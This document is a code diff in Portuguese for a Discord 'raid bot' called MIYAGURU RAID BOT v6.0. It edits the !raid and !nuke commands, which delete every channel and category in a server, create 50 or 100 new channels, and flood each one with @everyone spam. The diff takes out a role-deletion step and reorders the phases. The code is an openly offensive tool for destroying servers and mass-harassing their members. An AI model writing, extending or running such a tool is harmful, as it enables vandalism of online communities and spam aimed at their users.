@@ -401,7 +401,9 @@ async def on_ready():
     print(f"  Owner ID: {OWNER_ID}")
     print("=" * 50)
     print("\nComandos do bot:")
-    print("  !raid          — RAID COMPLETO (apaga + cria 50 + spam)")
+    print("  !raid          — RAID COMPLETO (prioridade: canais)\n")
+    print("                 Apaga canais + categorias\n")
+    print("                 Cria 50 canais + 15 msgs @everyone")
     print("  !nuke          — Apaga tudo + cria 100 canais + spam")
     print("  !raid stop     — Para")
     print("  !backup        — Backup com permissões")
@@ -1199,37 +1201,31 @@ async def on_message(message):
         # Escaneia o servidor
         total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
         total_cats = len(guild.categories)
-        total_roles = len([r for r in guild.roles if not r.is_default()])
         size_type, _, _, _ = detect_server_size(guild)
-        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | {total_roles} roles | Método: {size_type}")
+        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | Método: {size_type}")
 
-        # Fase 1: Apagar canais (PARALELO)
-        print("[1/5] Apagando canais...")
+        # Fase 1: Apagar canais (PRIORIDADE MÁXIMA)
+        print("[1/4] Apagando canais...")
         deleted_ch = await delete_all_channels(guild)
 
-        # Fase 2: Apagar categorias (PARALELO)
-        print("[2/5] Apagando categorias...")
+        # Fase 2: Apagar categorias
+        print("[2/4] Apagando categorias...")
         deleted_cat = await delete_all_categories(guild)
 
-        # Fase 3: Apagar roles
-        print("[3/5] Apagando roles...")
-        deleted_r = await delete_all_roles(guild)
-
-        # Fase 4: Criar canais (PARALELO)
-        print("[4/5] Criando 50 canais (paralelo)...")
+        # Fase 3: Criar canais (PARALELO)
+        print("[3/4] Criando 50 canais (paralelo)...")
         new_channels = await create_all_channels(guild, count=50)
         created = len(new_channels)
         print(f"      {created} canais criados")
 
-        # Fase 5: Spam 15 msgs por canal (PARALELO)
-        print("[5/5] Enviando 15 msgs por canal (paralelo)...")
+        # Fase 4: Spam 15 msgs por canal (PARALELO)
+        print("[4/4] Enviando 15 msgs por canal (paralelo)...")
         sent = await spam_all_channels(new_channels)
         print(f"      {sent} mensagens enviadas")
 
         print(f"\n[RAID] RAID CONCLUÍDO!")
-        print(f"       Canais apagados: {deleted_ch}")
-        print(f"       Categorias apagadas: {deleted_cat}")
-        print(f"       Roles apagadas: {deleted_r}")
+        print(f"       Canais apagados: {deleted_ch}/{total_channels}")
+        print(f"       Categorias apagadas: {deleted_cat}/{total_cats}")
         print(f"       Canais criados: {created}")
         print(f"       Mensagens: {sent}")
 
@@ -1238,7 +1234,6 @@ async def on_message(message):
                 f"✅ RAID CONCLUÍDO!\n"
                 f"📡 {deleted_ch}/{total_channels} canais apagados\n"
                 f"🗂️ {deleted_cat}/{total_cats} categorias apagadas\n"
-                f"🗑️ {deleted_r}/{total_roles} roles apagadas\n"
                 f"📂 {created} novos canais\n"
                 f"💬 {sent} mensagens enviadas\n"
                 f"💾 Backup salvo (com permissões)"
@@ -1282,37 +1277,31 @@ async def on_message(message):
         # Escaneia o servidor
         total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
         total_cats = len(guild.categories)
-        total_roles = len([r for r in guild.roles if not r.is_default()])
         size_type, _, _, _ = detect_server_size(guild)
-        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | {total_roles} roles | Método: {size_type}")
+        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | Método: {size_type}")
 
-        # Fase 1: Apagar canais
-        print("[1/5] Apagando canais...")
+        # Fase 1: Apagar canais (PRIORIDADE MÁXIMA)
+        print("[1/4] Apagando canais...")
         deleted_ch = await delete_all_channels(guild)
 
         # Fase 2: Apagar categorias
-        print("[2/5] Apagando categorias...")
+        print("[2/4] Apagando categorias...")
         deleted_cat = await delete_all_categories(guild)
 
-        # Fase 3: Apagar roles
-        print("[3/5] Apagando roles...")
-        deleted_r = await delete_all_roles(guild)
-
-        # Fase 4: Criar 100 canais (em lotes)
-        print("[4/5] Criando 100 canais (lotes)...")
+        # Fase 3: Criar 100 canais
+        print("[3/4] Criando 100 canais (paralelo)...")
         new_channels = await create_all_channels(guild, count=100)
         created = len(new_channels)
         print(f"      {created} canais criados")
 
-        # Fase 5: Spam 15 msgs por canal
-        print("[5/5] Enviando 15 msgs por canal (paralelo)...")
+        # Fase 4: Spam 15 msgs por canal
+        print("[4/4] Enviando 15 msgs por canal (paralelo)...")
         sent = await spam_all_channels(new_channels)
         print(f"      {sent} mensagens enviadas")
 
         print(f"\n[NUKE] NUKE CONCLUÍDO!")
         print(f"       Canais apagados: {deleted_ch}/{total_channels}")
         print(f"       Categorias apagadas: {deleted_cat}/{total_cats}")
-        print(f"       Roles apagadas: {deleted_r}")
         print(f"       Canais criados: {created}")
         print(f"       Mensagens: {sent}")
 
@@ -1321,7 +1310,6 @@ async def on_message(message):
                 f"💣 NUKE CONCLUÍDO!\n"
                 f"📡 {deleted_ch}/{total_channels} canais apagados\n"
                 f"🗂️ {deleted_cat}/{total_cats} categorias apagadas\n"
-                f"🗑️ {deleted_r} roles apagadas\n"
                 f"📂 {created} novos canais (100)\n"
                 f"💬 {sent} mensagens enviadas\n"
                 f"💾 Backup salvo (com permissões)"
@@ -1430,8 +1418,8 @@ async def on_message(message):
                 "**MIYAGURU RAID BOT v6.0**\n\n"
                 "**🤖 Comandos do Bot:**\n"
                 "```\n"
-                "!raid          — RAID COMPLETO (paralelo)\n"
-                "                 Apaga canais + categorias + roles\n"
+                "!raid          — RAID COMPLETO (prioridade: canais)\n"
+                "                 Apaga todos os canais + categorias\n"
                 "                 Cria 50 canais + 15 msgs @everyone\n"
                 "                 Backup auto + config auto\n\n"
                 "!nuke          — Apaga tudo + cria 100 canais + spam\n"
